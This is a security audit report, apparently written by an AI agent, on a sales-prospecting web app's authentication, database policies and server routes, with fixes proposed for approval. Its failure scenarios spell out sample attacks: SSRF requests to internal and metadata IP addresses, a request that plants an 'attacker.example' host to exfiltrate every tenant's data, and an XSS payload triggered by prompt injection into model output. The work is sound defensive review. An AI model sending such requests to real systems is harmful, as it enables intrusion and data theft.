# AUDIT — prospector-auth-v1-audit (read-only)

Date: 2026-10-05 · Base: `ac298fe` + uncommitted bio-link diff (`api/businesses/shared.js`)
Calls: 0 Apollo, 0 Anthropic, 0 data writes. Live reads only: one policy-introspection RPC + one public-key `head` count per table (48 tables), public `/auth/v1/settings`, 5 public-key RPC probes, 2 row counts.

## Summary

The database layer holds: the public key reads 0 rows on all 48 tables, the introspection RPCs refuse it, and the `s5_*` policies match the spec. The weak spot is the **server**. `sessionAuth` only checks for "a signed-in user with a profile", and Supabase sign-up is **open** (Google + email are enabled, `disable_signup` is false). So **any Google account, with no invite, gets past every route that isn't under `/api/businesses/:id`, `/api/sales/:id`, `/api/projects/:id` or `/api/campaigns/:id`.** Several of those routes take a workspace id or a URL from the request body and use the service key. Inside the gated routes, two handlers trust a second id from the body without tying it to the workspace.

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 6 |
| Medium | 4 |
| Low | 6 |

---

## Critical

### C1. A signed-up stranger with no workspace reaches ~30 ungated routes
- **Where:** `api/lib/requireAuth.js:46` (the only check is that the profile exists). Ungated routes are at `server.js:100` (`/proxy/jina`), `:351-382` (personas, stealth, lookalike, categorize, email, learn-voice, analyze-voice, meetingprep, glean, gmail-intent, handoff, sfdc/*, gmail/draft, hunter/*, databricks/*) and `:590` (`/api/sfdc/sync-now`).
- **Evidence:** `GET /auth/v1/settings` shows `disable_signup: false`, `external.google: true`, `mailer_autoconfirm: false`. Google sign-ups arrive already confirmed, so `handle_verified_auth_user` creates a profile right away.
- **Failure scenario:** someone signs in with any Gmail account at prod. They see "No workspace yet", but their `prospector_at` cookie passes `sessionAuth`. From there they can call `/api/email` with a guessed or leaked workspace id (H3), use `/api/sfdc/update-opp` as an SSRF probe (H1), spend Hunter credits (`/api/hunter/find`, `domain-search`), run Anthropic-backed routes with no rate limit (M1), and trigger a compliance sweep across all tenants (H2).
- **Fix:** in `sessionAuth`, after loading memberships, return 403 unless `isPlatformOwner || memberships.length > 0`. Exempt only `GET /api/me`, `POST /api/me/welcome` and `POST /api/invites/:token/accept`, which the first-run and invite flows need before a membership exists. Then decide per route whether "any membership" is enough. Hunter, Databricks and SFDC are single-tenant integrations and probably want `platformOwnerOnly`.

## High

### H1. Reflected SSRF through the client-supplied Salesforce instance URL
- **Where:** `api/sfdc/update-opp.js:10` (PATCH to `${instanceUrl}/…`, returns up to 500 chars of the response body), `api/sfdc/accounts.js:47`, `api/sfdc/my-accounts.js:38`, `api/sfdc/production-request.js:95`.
- **Failure scenario:** `POST /api/sfdc/update-opp {instanceUrl:"http://10.x.x.x:port", accessToken:"x", oppId:"y", fields:{}}`. The server sends a request into Render's private network and returns the response text. Through C1, anyone can do this.
- **Fix:** add one validator in `api/lib/` that requires `https:` and a host ending in `.salesforce.com`, `.force.com` or `.cloudforce.com`. Use it in all four routes and in `sync-compliance.js`.

### H2. Any signed-in user can trigger the all-tenant SFDC sweep and plant the cron's global token
- **Where:** `server.js:590-600` (no role gate), `api/sfdc/sync-compliance.js:41-50` (stores a client-sent token and instance as `sfdc_tokens.primary` when none exists), `server.js:267` (every SFDC OAuth callback overwrites `primary`).
- **Evidence:** `sfdc_tokens` has **0 rows** live, so the "store the client's token" branch is reachable today.
- **Failure scenario:** a stranger posts `{clientToken, clientInstance:"https://attacker.example"}` to `/api/sfdc/sync-now`. The server stores it as `primary`, reads every `accounts` row across all workspaces, and sends each Active Deal's `clientId` to the attacker's host. The 6-hourly cron then repeats that indefinitely. Separately, any user who connects their own Salesforce replaces the shared cron token.
- **Fix:** gate `/api/sfdc/sync-now` with `platformOwnerOnly`. Remove the client-token re-store branch. Write `primary` in the callback only when `req.auth.isPlatformOwner`. Apply H1's instance validator.

### H3. `/api/email` reads any workspace's private settings by body id
- **Where:** `api/email.js:92` (takes `businessId`, `projectId`, `campaignId`, `runningUserEmail` from the body), `:176-232` (service-key reads of `business_profiles.assay_criteria/outreach_rules/sales_methodology`, `projects.*`, `campaigns.*`), `:164` (`voice_profiles` by a client-sent email). No `hasRole` anywhere in the file.
- **Failure scenario:** a member of workspace A, or a stranger via C1, sends B's `businessId` or `projectId`. B's outreach rules, methodology, project hook and distilled past examples go into the prompt, and the model's output echoes them. `runningUserEmail: "jackcarlsig16@gmail.com"` writes in Jack's voice profile.
- **Fix:** require `hasRole(req, businessId, 'viewer')`. Resolve `projectId` and `campaignId` to their `business_id` and require that it equals `businessId`. Take the voice profile from `req.auth.user.email` only.

### H4. `influencer-assess` writes to any account's influencer details, then returns them
- **Where:** `api/businesses/influencer-assess.js:10-17` → `api/businesses/shared.js:386` and the update at `:432` (`.eq('account_id', accountId)` only, service key).
- **Failure scenario:** a Member of A posts to `/api/businesses/A/influencer/assess` with an `accountId` from B. B's `account_influencer_details` row is overwritten (bio, fit score, `assessment_status`) and the whole row is returned.
- **Fix:** before assessing, `select id from accounts where id = accountId and business_id = :id`, and return 404 if no row matches.

### H5. `intake-confirm` files intel into any workspace's project and returns the full project row
- **Where:** `api/businesses/intake-confirm.js:36` (`redirect_to_project` → `fileProjectIntel(action.projectId)` with no workspace check), `:111-116` (the confirm path uses the *project's* `business_id`, not `:id`), `api/businesses/shared.js:946-953` (`select('*')` returned to the caller).
- **Failure scenario:** a Member of A posts `{action:{type:'redirect_to_project', projectId:<B's project>}, text:"…"}`. It inserts an intel entry into B's project, runs B's strategy regeneration (an Anthropic call), and returns B's full `projects` row.
- **Fix:** look up the project with `.eq('business_id', id)` in both paths and return 404 if no row matches.

### H6. SSRF in `fetchSiteContent`, which gates the bio-link scrape
- **Where:** `api/lib/fetchSiteContent.js:29-38`. The direct fetch has no scheme, host or IP check. It follows redirects by default (up to 20 hops), and `await directRes.text()` reads an **unbounded** body before slicing it to 4,000 chars.
- **Callers:**
  - **NEW, uncommitted:** `api/businesses/shared.js:404`. The URL comes from the pasted creator bio, so the creator controls it, not our user. `BIO_URL_PATTERN` rejects IP literals, ports and dotless hosts in the *initial* URL. It does not stop (a) a domain whose DNS points to a private address, or (b) a public linktree page that redirects to `http://169.254.169.254/…` or `http://10.x…`. The direct fallback runs whenever Jina fails, and Jina fails on exactly those targets.
  - **LIVE today:** `api/businesses/shared.js:1225` (research on `businesses.website_url`). `website-url-save.js:11` only checks for `^https?://`, so a workspace Admin can set `http://10.0.0.5:8080/`, press "Retry research", and read the response back in `business_intel_entries`.
- **Failure scenario (bio-link):** a creator's bio says `mylinks.example`, which returns a 302 to an internal address. Up to 4,000 chars of the internal response go into the prompt. If they contain an email address it's stored as `scraped_email`, and the model may echo a "company" into `scraped_company`.
- **Fix:** add a `safeFetch` in `api/lib/`. Allow only `http:`/`https:`. Resolve DNS and reject loopback, private (10/8, 172.16/12, 192.168/16), link-local (169.254/16), CGNAT (100.64/10), `0.0.0.0/8`, and IPv6 `::1`, `fc00::/7` and `fe80::/10`. Use `redirect:'manual'` and re-validate each hop (max 3). Stream the body with a 1 MB cap and keep the 10 s timeout. Use it for the direct fetch, and pass the redirect-checked final URL to Jina too. **The bio-link scrape stays held until this lands.**

## Medium

### M1. Server-side AI routes bypass the Anthropic rate limit
- **Where:** only `/proxy/anthropic/messages` uses `anthropicRateLimit` (`server.js:51`). These routes call Anthropic directly with the server key and no cap: `/api/email`, personas, stealth, lookalike, categorize, learn-voice, analyze-voice, meetingprep, gmail-intent, glean, `databricks/gong-enrich` and `gong-trends`, influencer-assess, intake/intake-confirm, assay-criteria and outreach-rules generate, profile-refresh, and the outreach-examples routes.
- **Failure scenario:** a loop on `/api/email` burns credits with no ceiling. With C1, a stranger can do it.
- **Fix:** mount `authMw('anthropicRateLimit')` on these routes. The cleaner option is to rate-limit inside the shared `callAnthropic` helper, keyed on the user. That overlaps with the queued `prospector-ai-data-efficiency-v1` "one AI wrapper", which may be the right home for it.

### M2. Model-generated HTML is rendered without sanitizing
- **Where:** `src/components/pricing/ProposalBuilderModal.js:864` (`dangerouslySetInnerHTML={{__html: output}}`, where `page2Html` is streamed model output, `:643`). `src/components/DealExportModal.js:815` also renders `renderPricingPreviewHtml`, and I didn't check whether it escapes its input.
- **Failure scenario:** account intel, transcripts or scraped content carry a prompt injection. The model emits `<img src=x onerror=…>`, which runs in Prospector's origin and can read the session (the cookie isn't HttpOnly by design, and Supabase keeps the refresh token in localStorage).
- **Fix:** run the HTML through DOMPurify before rendering. Check that `renderPricingPreviewHtml` escapes interpolated fields.

### M3. A Member can move a workspace account into their personal territory
- **Where:** live policy `accounts.s5_update`, with `CHECK can_access_account_row(business_id, owner_email, 'member')`. Changing `business_id` to NULL with `owner_email` set to yourself passes the check.
- **Failure scenario:** a Member runs `update accounts set business_id = null, owner_email = '<me>'` from the browser. The account disappears from the team and only that Member can see it.
- **Fix:** add a BEFORE UPDATE trigger or a tighter CHECK that refuses `business_id` going from non-null to null (or requires admin on the old workspace).

### M4. Signing out doesn't revoke server access straight away
- **Where:** `api/lib/requireAuth.js:18` (60 s cache that trusts verified tokens) and `src/utils/authSession.js:26-29` (sign-out clears the cookie in the browser only).
- **Failure scenario:** a copied `prospector_at` token keeps working on `/api` for at least 60 s after sign-out, and until the JWT expires (~1 h) if `auth.getUser` accepts tokens from a signed-out session. **Not verified** which way Supabase behaves here. That needs a temp-user test, which counts as a data write, so I didn't run it.
- **Fix:** accept and document it, or add `POST /api/me/sign-out` that evicts the cache entry and calls `auth.admin.signOut(jwt)`.

## Low

- **L1. `list_business_id()` can be called with the public key.** Probe: `rpc('list_business_id')` → allowed. It returns any list's workspace id to an unauthenticated caller who has the list uuid. Fix: `REVOKE EXECUTE … FROM anon, public; GRANT … TO authenticated` (and the same for `can_access_account`, `is_member` and `has_role`, which are callable but only ever return false for anon).
- **L2. `account_lists` write CHECK only checks the account.** A Member of A can link A's account to B's list id (`s5_write` = `can_access_account(account_id,'member')`). B can't see the link, so the only harm is junk rows. Fix: also require `has_role(list_business_id(list_id),'member')`.
- **L3. An invite is burned if the membership write fails.** `api/invites.js:59-75` claims the invite first, then upserts the membership. If the upsert fails, the link is dead. Re-issuing a link recovers it. Last-owner protection `api/businesses/members.js:64` is check-then-act (two owners demoting each other at once could leave zero owners). No app-level rate limit on invite creation or emails (Admin-only) or on sign-in (Supabase's own limits apply).
- **L4. `/api/handoff` (Disco Coach) is still wired** (`server.js:363-371`): CORS `*`, service-key writes to `handoff_intel`, nothing in `src` calls it, and Jack said 2026-10-01 that Disco Coach isn't used. It's a removal candidate (needs Jack's OK).
- **L5. `/proxy/jina` relays any URL for any signed-in user** (`server.js:100`). The fetch happens at Jina, so it can't reach internal hosts. It's an open relay that uses our Jina key. C1 shrinks the exposure. `src/utils/assay.js` uses it, so keep it.
- **L6. RLS can't be proven over REST on empty tables.** `bdr_assignments`, `frontier`, `handoff_intel`, `outreach_drafts`, `sales_collateral`, `sales_insight_dismissals`, `sfdc_tokens` and `zoom_webhook_events` have no policies and 0 rows, so a public-key count of 0 doesn't show whether RLS is on. Migrations enable it on all of them. One SQL query confirms it (in the chat reply).

## Checked and clean

- **Public key:** 0 rows on all 48 live tables. `audit_table_policies` and `audit_table_schema` refused (42501).
- **Helpers:** `is_platform_owner`, `is_member`, `has_role`, `can_access_account_row`, `can_access_account` and `list_business_id` are all `SECURITY DEFINER` with `SET search_path = public`. A NULL workspace id returns false except for the platform owner. `jwt_email`/`role_rank` aren't definer functions and reference no table.
- **Blank-owner edge case:** `can_access_account_row` with an empty `owner_email` matches a JWT with no email. It's unreachable today: 0 personal-territory accounts, anonymous sign-in off, email confirmation on.
- **Live policies match spec** for the 20 business tables, the 4 Goals tables (plus the 32/32 temp-user check this session), `profiles`/`auth_events` (own rows or platform owner), `business_members` (own or admin), `outreach_doctrine` (read all, write platform owner), `plospect_compliance`/`voice_profiles`.
- **Invites:** 24-byte random token, only the sha256 stored, 7-day expiry, conditional single-use claim, bound to the invited email, Owner invites need an Owner, an existing linked member can't be re-invited to change their role.
- **Cookie:** `SameSite=Lax`, `Secure` on https, Max-Age = token lifetime, refreshed on `onAuthStateChange`. It's not HttpOnly (it's set by JS on purpose), which exposes nothing beyond what Supabase's localStorage session already does. `onrender.com` is on the Public Suffix List, so other Render apps aren't same-site.
- **Gated routes:** `businessGate`/`salesGate`/`parentGate` are mounted before every route. Sales opportunity and prospect updates check `business_id` first. `call-log-reassign` ties the entry, account and project to `:id`. `intake-confirm`'s accounts path does too (`:69`).
- **Leftovers:** 0 references to `team_users`, `approved_users`, `access_log`, notify-pending/approved, the master code or `utils/invites` in `src`/`api`/`server.js`. `prospector_team_users` survives only as a localStorage roster (deliberate trade-off, 6 refs).

## Not covered (time box)

- Databricks routes beyond the gating question (their SQL is parameterized). They aren't configured in local `.env`, and whether they're set on Render is unknown.
- The client-side role logic (the 181 AE/BDR refs already go to nav-admin-cleanup-v1).
- Google OAuth routes, which were verified 24/24 in FIX google-calendar-consent-once and not re-audited.

---

## FIX items for Jack to approve

1. **FIX-1 (C1):** `sessionAuth` requires a membership or platform owner. Exempt only `/api/me`, `/api/me/welcome` and invite accept. Hunter/Databricks/SFDC/gmail-draft become `platformOwnerOnly` *(confirm: does Cyrus use any of these?)*.
2. **FIX-2 (H1, H2):** Salesforce instance-URL allowlist in one util. `sync-now` becomes platform-owner-only. Remove the client-token re-store. The callback writes `primary` only for the platform owner.
3. **FIX-3 (H3, H4, H5):** tie every body id to the workspace in `/api/email` (plus voice profile from the session), `influencer-assess` and `intake-confirm`.
4. **FIX-4 (H6):** shared `safeFetch` (scheme, DNS→private-IP block, manual redirects re-checked, 1 MB stream cap) used by `fetchSiteContent`. **This unblocks the bio-link scrape.**
5. **FIX-5 (M1):** per-user Anthropic cap on the server-side AI routes (or fold into `prospector-ai-data-efficiency-v1`'s single AI wrapper).
6. **FIX-6 (M2):** DOMPurify on the two `dangerouslySetInnerHTML` sinks.
7. **FIX-7 (M3, L1, L2):** one small RLS migration: block workspace→personal moves, revoke public-key EXECUTE on the helpers, tighten the `account_lists` CHECK.
8. **FIX-8 (L4):** remove `/api/handoff` *(needs Jack's OK)*.
9. Optional **(M4):** server-side sign-out eviction.
